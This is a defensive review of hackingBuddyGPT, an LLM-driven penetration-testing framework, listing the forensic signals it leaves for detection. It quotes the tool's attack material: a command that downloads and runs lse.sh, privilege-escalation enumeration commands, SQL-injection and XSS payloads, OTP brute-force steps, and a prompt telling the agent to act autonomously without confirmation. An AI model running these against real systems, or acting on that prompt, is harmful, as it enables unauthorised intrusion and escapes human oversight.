# What hackingBuddyGPT leaves behind

hackingBuddyGPT ([ipa-lab/hackingBuddyGPT](https://github.com/ipa-lab/hackingBuddyGPT); first commit April 26, 2023; MIT license; 1,347 stars and 237 forks on November 26, 2026; Python; tags `v0.1.0` to `v0.5.0`; reviewed at `e23d9185` (`e23d918592556f71b8e3b2ee152449e82fa14794`), October 24, 2026, the head of `main` on November 26, 2026) is a Python framework for LLM-driven security-testing agents from the IPA lab at TU Wien, described in the paper "Getting pwn'd by AI: Penetration Testing with Large Language Models" (arXiv 2308.00121, `README.md:290-294`). Each experiment is a "use-case" started as a sub-command of the `wintermute` CLI. The model picks a command, the framework runs it on the target over SSH, psexec or HTTP with no approval step, and the output goes back to the model until it reaches root (or Administrator), submits all flags, or hits a round, token, cost or time limit (`src/hackingBuddyGPT/usecases/usecase.py:68-99`).

The use-cases at this commit are `MinimalPrivEscLinux`, `MinimalToolCallPrivEscLinux`, `PrivEscLinux`, `ExPrivEscLinuxLSE`, `PrivEscWindows`, `WebTestingWithExplanation`, `WebTestingWithShell`, `AdvancedWebTesting`, `WebAPITesting` and `AD` (an Active Directory planner/executor ported from the same author's *cochise* tool). The names are the class names with `UseCase` removed (`usecases/usecase.py:158-165`; the `@use_case` lines in `usecases/`).

**Fragility** says what it takes to remove a signal: *code* means editing hackingBuddyGPT, *config* means a setting (`.env`, a JSON config or a command-line flag), *operator* means a choice made at run time. *Code (prompt)* marks a value that is only shown to the model as an example or instruction: removing it means editing the code, but the model may also leave it out on any run, so treat it as likely, not certain. *Library* marks behavior of a dependency, not of hackingBuddyGPT's own code (inferred, not observed).

File references are to `src/hackingBuddyGPT/` unless they start with a top-level file name.

## How it runs

| Part | What it does | Code |
|---|---|---|
| CLI | `wintermute <UseCase> [--option=value ...]` (also installed as `hackingBuddyGPT`). With no use-case it lists them all. Options can also come from environment variables, a `.env` file in the working folder, or `--config <file>.json` | `pyproject.toml:82-86`, `cli/wintermute.py:8-20`, `utils/configurable.py:713-751`, `README.md:24-40` |
| Log tools | `hackingbuddygpt-log-view logs/log-<timestamp>.jsonl` replays a run in the terminal; `hackingbuddygpt-log-analyze logs/*.jsonl [--latex]` builds a statistics table | `pyproject.toml:85-86`, `cli/log_viewer.py:4`, `cli/log_analyze.py:4` |
| Benchmark launcher | `uv run benchmark_privesc.py --provider ollama\|openrouter ...` finds running Docker containers whose image name starts with `privesc_` and runs `python -m hackingBuddyGPT.cli.wintermute <UseCase> --conn.host=127.0.0.1 --conn.port=<port> --conn.username=lowpriv --conn.password=trustno1 ... --log.log_dir=<dir> --log.tag=<tag>` against each | `benchmark_privesc.py:95,232-249,552-554` |
| Package and container | PyPI package `hackingBuddyGPT` (0.3.1 is the latest there; the repository is at 0.5.0). Docker image `ghcr.io/ipa-lab/hackingbuddygpt:latest` plus a timestamp tag, built from `python:3.13-slim` with `ENTRYPOINT ["wintermute"]` on every push to `main` | `pyproject.toml:2,16`, `Dockerfile:1-7`, `.github/workflows/publish-docker.yml:23-40`, `README.md:181` |
| Web interface, API server, listener | None. No HTTP server, socket listener, MCP server or web page in the code | whole tree |
| Targets | Linux over SSH (asyncssh, one persistent PTY shell), Windows over SMB with pypsexec, web sites and REST APIs over HTTP with Python requests, and a Kali "jump host" over SSH for the web-with-shell and AD use-cases | `utils/connectors/*.py`, `capabilities/http_request.py` |
| Credentials on targets | The operator supplies them. `.env.example`, the README and the benchmark default to the low-privilege account `lowpriv` / `trustno1` of the IPA lab's own privilege-escalation VMs | `.env.example:34-36`, `README.md:35-37,170-171`, `benchmark_privesc.py:552-553` |
| Model | Any model through litellm: `llm.model` in litellm format (no default in code), `llm.api_key`. `.env.example` sets `openrouter/anthropic/claude-3.5-sonnet`, so traffic goes to OpenRouter (Anthropic's model, reached through OpenRouter, not Anthropic's API). The `api_base` option defaults to `https://openrouter.ai/api` but is not passed to litellm at this commit (commented out), so the litellm model prefix picks the endpoint. The benchmark defaults to a local Ollama (`ollama_chat/llama3`, `http://localhost:11434`) | `utils/llm.py:29-44,137-148`, `.env.example:13-19`, `benchmark_privesc.py:70-73,540` |
| Autonomy | No human approval for any command. The web prompts end "You are running autonomously with full permissions to do whatever is necessary to achieve your goal. Do not ask for input or confirmation, nobody will answer. Just do it." | `usecases/web/_base.py:22-25` |
| Output | `logs/log-<YYYYMMDD-HHMMSS>.jsonl` in the working folder for every run (`--log.log_dir` changes it); the web-API use-case also writes an OpenAPI file and a Markdown report inside the installed package folder | `utils/log_storage.py:113-131`, `utils/logging.py:89-95` |
| Telemetry, update check, notifications | None in hackingBuddyGPT's code. What litellm itself does on import was not reviewed | — |

## Signals on the target side

| Signal | What it looks like | Code | Fragility |
|---|---|---|---|
| Linux shell framing | Every command in the Linux privilege-escalation use-cases is typed into one persistent interactive bash over SSH, wrapped as `echo __CMDSTART_<8 hex>__`, then the command, then `echo "__CMDEND_<8 hex>__:$?:$(id -u):$(id -un)"`. The marker text is in the shell's history (`~/.bash_history` of the login account, and of root after a `sudo su`) and in TTY audit records. Because of `$(id -u)` and `$(id -un)`, every agent command is followed by an `id -u` and an `id -un` process, children of the login shell | `utils/connectors/ssh_interactive_connection.py:112-143` | Code |
| Password prompts answered | If the output shows `[sudo] password for ...:`, `assword:` or `'s password:`, the configured password is typed once per command | `utils/connectors/ssh_interactive_connection.py:13,137-139` | Code |
| SSH client | asyncssh, so the SSH client version string should be `SSH-2.0-AsyncSSH_<version>` (library default, inferred). Host keys are not checked (`known_hosts=None`), no agent and no default keys are offered, a PTY of type `xterm`, 200x50, is requested. A credential test (`test_credential` tool) opens a second, short SSH session that runs only `id` | `utils/connectors/ssh_interactive_connection.py:66-87,207-220` | Library (banner), code |
| SSH client (Kali jump host) | `WebTestingWithShell` and `AdvancedWebTesting` use Fabric (paramiko, `SSH-2.0-paramiko_<version>`, inferred) and answer `[sudo] password for <user>:`; `AD` uses asyncssh exec channels with a 600 second timeout. Both talk to the operator's own Kali box, not to the target | `utils/connectors/ssh_connection.py:23-41`, `capabilities/ssh_run_command.py:24-32`, `utils/connectors/async_ssh_connection.py:28,39-46` | Library |
| lse.sh enumeration | `ExPrivEscLinuxLSE` runs, on the target: `wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 \| grep -v 'nope$' \| grep -v 'skip$'` | `usecases/call_usecase_from_usecase.py:36` | Code |
| Enumeration hints | With `--enable_structured_guidance`, `PrivEscLinux` suggests `find / -perm -4000 2>/dev/null`, `sudo -l`, `cat /etc/crontab && ls -la /etc/cron.*`, `find / -type d -perm -002 2>/dev/null`, `uname -a && lsb_release -a` | `usecases/priv_esc/linux_privesc.py:158-164` | Code (prompt) |
| Windows | `PrivEscWindows` connects with pypsexec to SMB 445, installs pypsexec's temporary service and runs every command as `cmd.exe /c <command>` with a 2 second timeout; the credential test runs `whoami /groups` and `whoami`. Service and binary names come from pypsexec (PAExec based) and are shared with every pypsexec or PAExec user; they were not checked here | `utils/connectors/psexec.py:20-35`, `capabilities/psexec_test_credential.py:30-40` | Library |
| HTTP client | Python requests with its default `User-Agent: python-requests/<version>` for every web and web-API request; one cookie jar per capability; redirects not followed. Nothing in the user agent names the tool | `capabilities/http_request.py:17-23,70-77` | Code |
| Web-API discovery paths | `WebAPITesting` cycles through a fixed list of about 110 common API paths, with `{id}` replaced by `1`. A missing comma joins two entries into `/products/{id}/users/profile`, so the path `/products/1/users/profile` is requested | `usecases/web_api/detection_response_handler.py:45-76,241-250` | Code |
| Web-API discovery query values | In its query step the code itself (not the model) appends one parameter from a fixed table: `page=2`, `limit=10`, `sort=date_desc`, `filter=status%3Aactive`, `search=example+query`, `api_key=YourAPIKeyHere`, `access_token=YourAccessToken`, `callback=myFunction`, `fields=id%2Cname%2Cstatus`, `expand=details%2Cowner`, `since=2020-01-01T00%3A00%3A00Z`, `until=2022-01-01T00%3A00%3A00Z`, `status=active`, `lang=en`, `locale=en_US`, `region=North+America`, `embed=true`, `version=1.0`, `format=json` or `username=test` | `usecases/web_api/detection_response_handler.py:389-459,474-481` | Code |
| Web-API test accounts | Accounts are made with Faker (random e-mail and password) and carry an extra field `"x": <counter>` (and `"api": "<first path part starting with api>"`) that is sent with them; when the model gives no body, the account dict itself is sent | `utils/prompt_generation/information/_pentesting_core.py:50-52,585-597,696-708`, `usecases/web_api/proposed_http_request.py:100-101` | Code |
| SQL injection on login | Test step: `Send a POST request to <login path> with user:{'email': "' or 1=1--", 'password': 'a', 'x': <counter>}` | `utils/prompt_generation/information/_pentesting_injection.py:176-198` | Code (prompt) |
| XSS in input | Test step with the body `{"email": "<script>alert(\"XSS2\")</script>", "password": ""}` | `utils/prompt_generation/information/_pentesting_injection.py:313-314` | Code (prompt) |
| OTP brute force | For every OTP endpoint: `POST` with `{'email': 'adam007@example.com', 'otp': '<n>', 'password': 'Az123###'}`, OTP 8859 first and then 10 random numbers below 9999, after a reset request for `adam007@example.com`. These are the victim account and password of the OWASP crAPI training API, so a crAPI walkthrough sends the same | `utils/prompt_generation/information/_pentesting_auth.py:526-545` | Code (prompt) |
| Bearer token | `Authorization: Bearer <token>` from the run's config or captured from a login response | `usecases/web_api/detection_response_handler.py:150-152`, `usecases/web_api/proposed_http_request.py:85-92` | Config |
| Flags | Web use-cases look for flags in the format `FLAG.<name>.GALF` (default names `hostname,dir,username,rootfile,secretfile,adminpass`). They are submitted to the agent itself, not to the target | `usecases/web/_base.py:37-48` | Config |
| Canaries, callbacks, OOB domains | None in the code | — | — |

## Signals on the operator host

| Signal | What it looks like | Code | Fragility |
|---|---|---|---|
| CLI process | `wintermute <UseCase> ...` or `hackingBuddyGPT <UseCase> ...` (console-script wrappers run by Python), `python -m hackingBuddyGPT.cli.wintermute <UseCase> ...` from the benchmark, `docker run ... ghcr.io/ipa-lab/hackingbuddygpt:latest <UseCase> ...`. Options look like `--llm.model=`, `--llm.api_key=` (the key on the command line when passed that way), `--conn.host=`, `--conn.username=`, `--conn.password=`, `--limits.max_rounds=`, `--log.tag=` | `pyproject.toml:82-86`, `benchmark_privesc.py:232-249`, `README.md:35-37,181` | Code (names), operator (options) |
| Local tmux mode | The `local_shell` connector drives a shell in an existing tmux session: `tmux send-keys -t <session> "echo 'CMDSTART<8 hex>'" Enter`, the command, `tmux send-keys -t <session> "echo 'CMDEND<8 hex>'" Enter`, and `tmux capture-pane -t <session> -p -S -1000` / `-S -50000`, `tmux display-message -t <session> -p '#{cursor_x},#{cursor_y}'`; a fallback sends `clear`, `echo "__CLEAR_<8 hex>__"` and `echo "__END_<8 hex>__"` and sets `history-limit 50000`. The README documents `--conn=local_shell --conn.tmux_session=hacking_session`; no registered use-case at this commit references the connector, so whether it runs at this commit was not confirmed | `utils/connectors/local_shell.py:63-97,169-260`, `capabilities/local_shell.py`, `README.md:157-165` | Code |
| Run log | `logs/log-<YYYYMMDD-HHMMSS>.jsonl` (or `-1`, `-2` ... for runs in the same second). One OpenTelemetry-style span per line with the attributes `hackingbuddygpt.run.name`, `hackingbuddygpt.run.tag`, `hackingbuddygpt.run.configuration`, `hackingbuddygpt.run.state` (`got root` on success), `hackingbuddygpt.cost.usd`, `hackingbuddygpt.tool.result` and the `gen_ai.*` keys, including every prompt, every command and its output. The console prints `logging run to logs/log-...jsonl` | `utils/log_storage.py:41-51,113-131`, `utils/logging.py:137-176` | Code (format), config (folder) |
| Web-API outputs | Inside the installed package: `.../hackingBuddyGPT/usecases/web_api/openapi_spec/<strategy>/<name>/<YYYY-MM-DD_HH-MM-SS>/<name>_spec.yaml` (title `Generated API Documentation <name>`) and `.../hackingBuddyGPT/usecases/web_api/reports/<name>/report_<YYYY-MM-DD_HH-MM-SS>.md` | `usecases/web_api/openapi_specification_handler.py:39-56`, `usecases/web_api/report_handler.py:34-42` | Code |
| Benchmark outputs | `benchmark_results/<YYYYMMDD-HHMMSS>/report.md` and `traces/<run>/console.log` with `log-*.jsonl` beside it | `benchmark_privesc.py:311-318,347,573,581` | Code |
| Config | `.env` in the working folder with `llm.api_key=`, `llm.model=`, `conn.host=`, `conn.password=` lines (dotted keys) | `.env.example:7-39` | Operator |
| Environment | `CLIENT_HTTP_PROXY` / `CLIENT_HTTPS_PROXY` route target HTTP traffic through a proxy and switch TLS checks off; `OLLAMA_API_BASE` is set for benchmark children; `OPENROUTER_API_KEY` is read by the benchmark | `capabilities/http_request.py:24-32`, `benchmark_privesc.py:257-263,568` | Operator |
| AD scenario | The `AD` use-case's default scenario tells the model the target is `192.168.122.0/24`, to ignore `192.168.122.1` and the `vagrant` user, that usernames are in `/osint_users.txt` and passwords in `/usr/share/wordlists/rockyou.txt`, and to use `netexec` (`nxc`), `nmap`, `impacket-*`, `hashcat` and `john` on the Kali host | `usecases/ad/templates/scenario.md:9,17-18,31-44`, `usecases/ad/ad.py:15-16,44-47` | Config (`--scenario_path`) |

## Outbound traffic from the operator host

| Destination | What it is | Code | Fragility |
|---|---|---|---|
| `openrouter.ai` (with the shipped `.env.example`), or any provider litellm supports | Model API calls through litellm | `.env.example:13`, `utils/llm.py:137-148` | Config |
| `localhost:11434` | Ollama, the benchmark's default provider | `benchmark_privesc.py:540` | Config |
| `ghcr.io` (`ipa-lab/hackingbuddygpt`) | Container pull | `README.md:181` | Operator |

No tunnels, MCP servers, telemetry, update checks or callback services are used. The lse.sh download goes from the target, not the operator host.

## Exposure

hackingBuddyGPT has no web console, API server or listening port, so there is nothing to find on the internet and no Shodan query is given.

## Signals in model traffic

Where model traffic is inspected, the prompts contain `You are a low-privilege user <user> with password <password>` and `your goal is to become the user '<target>' by abusing commands and misconfiguration on the tested system.` (`usecases/priv_esc/_base.py:21-39`), `You are a senior penetration tester, having received a new project of testing the server-side components of the website at` (`usecases/web/_base.py:58-60`), and tool names such as `execute_bash_command`, `test_credential`, `http_request`, `submit_flag`, `perform_task` and `execute_command` with `mitre_attack_technique` and `mitre_attack_procedure` arguments (`capabilities/_ssh_command.py:24-26`, `capabilities/ssh_execute_command.py:31-36`). The credentials of the target account are in the prompt.

## What has been seen in the wild

- No vendor or CERT report of hackingBuddyGPT used in an intrusion was found (searched November 26, 2026).
- It is research code with an academic paper, a public benchmark of vulnerable VMs and a Docker image. It is popular (over 1,300 stars), so expect students and security teams to run it.

## What the code does not contain

No implant, C2, web shell, persistence, payload or callback listener. Nothing is written to the target by the framework itself except what the model's commands write, and `lse.sh` in `ExPrivEscLinuxLSE`.

## Not verified, and inferred

- Nothing was run. The asyncssh and paramiko client version strings, the python-requests user agent and pypsexec's service names are library defaults, not observed.
- The README's `--conn=ssh` / `--conn=local_shell` switch could not be traced in `utils/configurable.py`; the privilege-escalation use-cases declare an `SSHInteractiveConnection` (`ssh_interactive`) field. So the shell framing above is what those use-cases use; the tmux markers apply only if the local-shell connector is used.
- Whether bash writes the marker lines to `~/.bash_history` depends on the target's `HISTFILE`/`HISTCONTROL` settings and on bash saving history when the SSH session closes.
- Repository creation date, archive state and the language list were not read from the GitHub API (rate limited); stars and forks are from the repository page. Commit `e23d9185` was the head of `main` on November 26, 2026 (`git ls-remote`).
- Strings marked *Code (prompt)* were not checked against real agent traffic.
